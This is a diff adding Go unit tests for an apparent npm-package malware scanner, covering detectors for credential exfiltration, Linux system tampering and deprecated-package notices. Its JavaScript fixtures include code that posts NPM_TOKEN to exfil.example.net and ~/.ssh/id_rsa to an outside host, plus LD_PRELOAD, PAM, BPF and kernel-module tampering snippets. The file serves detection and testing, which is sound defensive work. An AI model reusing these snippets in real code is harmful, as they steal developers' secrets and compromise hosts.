@@ -4,6 +4,7 @@ import (
 	"archive/tar"
 	"bytes"
 	"compress/gzip"
+	"strings"
 	"testing"
 )
 
@@ -369,6 +370,143 @@ func TestRunDetectors_RealObfuscationStillFires(t *testing.T) {
 	got := runOneCtx(body, "evil-pkg")
 	if !has(got, "Code Obfuscation") {
 		t.Errorf("expected Code Obfuscation to still fire on non-WASM base64 payload, got %v", got)
+	}
+}
+
+// --- Credential Exfil Flow ---------------------------------------------
+
+// TestRunDetectors_ExfilFlow_FiresOnNonCanonicalHost: malicious pattern
+// where a package reads NPM_TOKEN and POSTs it to an arbitrary host.
+func TestRunDetectors_ExfilFlow_FiresOnNonCanonicalHost(t *testing.T) {
+	body := `
+const tok = process.env.NPM_TOKEN;
+fetch('https://exfil.example.net/collect', { method: 'POST', body: tok });
+`
+	got := runOneCtx(body, "evil-pkg")
+	if !has(got, "Credential Exfil Flow") {
+		t.Errorf("expected Credential Exfil Flow to fire when NPM_TOKEN posted to arbitrary host, got %v", got)
+	}
+}
+
+// TestRunDetectors_ExfilFlow_AllowsCanonicalHost: legitimate API client
+// reading its provider's token and calling that provider's API. Common
+// pattern; must not trip the combined-flow detector. (The basic
+// Credential Theft detector also doesn't fire here because of own-config
+// matching for known third-party packages — we just want to confirm the
+// new detector is host-aware.)
+func TestRunDetectors_ExfilFlow_AllowsCanonicalHost(t *testing.T) {
+	body := `
+const token = process.env.GITHUB_TOKEN;
+fetch('https://api.github.com/repos/foo/bar', { headers: { Authorization: 'Bearer ' + token } });
+`
+	got := runOneCtx(body, "some-github-client")
+	if has(got, "Credential Exfil Flow") {
+		t.Errorf("Credential Exfil Flow should NOT fire when GITHUB_TOKEN is sent only to api.github.com, got %v", got)
+	}
+}
+
+// TestRunDetectors_ExfilFlow_FiresOnFileBasedRead: id_rsa or .npmrc reads
+// are unambiguous — the detector ignores the canonical-host allowlist
+// entirely for these.
+func TestRunDetectors_ExfilFlow_FiresOnFileBasedRead(t *testing.T) {
+	body := `
+const fs = require('fs');
+const key = fs.readFileSync(require('os').homedir() + '/.ssh/id_rsa');
+fetch('https://example.com/x', { method: 'POST', body: key });
+`
+	got := runOneCtx(body, "innocent-looking")
+	if !has(got, "Credential Exfil Flow") {
+		t.Errorf("expected Credential Exfil Flow on id_rsa read + outbound POST, got %v", got)
+	}
+}
+
+// TestRunDetectors_ExfilFlow_NoNetworkCall: bare credential read without
+// an outbound call should NOT fire the combined detector (the basic
+// Credential Theft detector still fires on the env-var read alone).
+func TestRunDetectors_ExfilFlow_NoNetworkCall(t *testing.T) {
+	body := `const tok = process.env.NPM_TOKEN; console.log("got it");`
+	got := runOneCtx(body, "evil-pkg")
+	if has(got, "Credential Exfil Flow") {
+		t.Errorf("Credential Exfil Flow should require an outbound call; got %v", got)
+	}
+}
+
+// --- Linux System Tampering --------------------------------------------
+
+func TestRunDetectors_LinuxTamper_PAM(t *testing.T) {
+	body := `Module._extensions['.so'] = function(m, fn) { /* shim */ };
+const lib = process.dlopen({}, '/lib/libpam.so.0', os.constants.dlopen.RTLD_NOW);
+pam_authenticate(handle, 0);`
+	got := runOneCtx(body, "x")
+	if !has(got, "Linux System Tampering") {
+		t.Errorf("expected Linux System Tampering on PAM symbols, got %v", got)
+	}
+}
+
+func TestRunDetectors_LinuxTamper_BPF(t *testing.T) {
+	body := `const fd = bpf_load_program(BPF_PROG_LOAD, prog, len);`
+	got := runOneCtx(body, "x")
+	if !has(got, "Linux System Tampering") {
+		t.Errorf("expected Linux System Tampering on bpf symbols, got %v", got)
+	}
+}
+
+func TestRunDetectors_LinuxTamper_KernelModule(t *testing.T) {
+	body := `init_module(image, len, "");`
+	got := runOneCtx(body, "x")
+	if !has(got, "Linux System Tampering") {
+		t.Errorf("expected Linux System Tampering on init_module(), got %v", got)
+	}
+}
+
+func TestRunDetectors_LinuxTamper_LDPRELOAD(t *testing.T) {
+	body := `const env = { ...process.env, LD_PRELOAD: '/tmp/malicious.so' };`
+	got := runOneCtx(body, "x")
+	if !has(got, "Linux System Tampering") {
+		t.Errorf("expected Linux System Tampering on LD_PRELOAD, got %v", got)
+	}
+}
+
+func TestRunDetectors_LinuxTamper_Benign(t *testing.T) {
+	// Routine substrings that COULD trigger naive matchers but don't
+	// match the curated word-bounded patterns. PAM as a comment, a
+	// variable named "perfEvent" or "ldPreload" without the underscore,
+	// arbitrary sentence containing "module".
+	body := `
+// This module loads a config. Module init order matters.
+const perfEvent = trackPerformance();
+const ldPreload = false;
+require('module');
+`
+	got := runOneCtx(body, "boring-pkg")
+	if has(got, "Linux System Tampering") {
+		t.Errorf("Linux System Tampering false-positive on benign code: %v", got)
+	}
+}
+
+// --- Notices (deprecated packages) -------------------------------------
+
+func TestNoticesFor_VM2(t *testing.T) {
+	got := noticesFor("vm2")
+	if len(got) == 0 || got[0].Kind != "deprecated" {
+		t.Errorf("expected deprecated notice for vm2, got %v", got)
+	}
+	if !strings.Contains(got[0].Message, "isolated-vm") {
+		t.Errorf("vm2 notice should suggest isolated-vm, got %q", got[0].Message)
+	}
+}
+
+func TestNoticesFor_CaseInsensitive(t *testing.T) {
+	got := noticesFor("VM2")
+	if len(got) == 0 {
+		t.Error("expected case-insensitive match for VM2")
+	}
+}
+
+func TestNoticesFor_UnrelatedPackage(t *testing.T) {
+	got := noticesFor("lodash")
+	if len(got) != 0 {
+		t.Errorf("lodash should have no notices, got %v", got)
 	}
 }
 
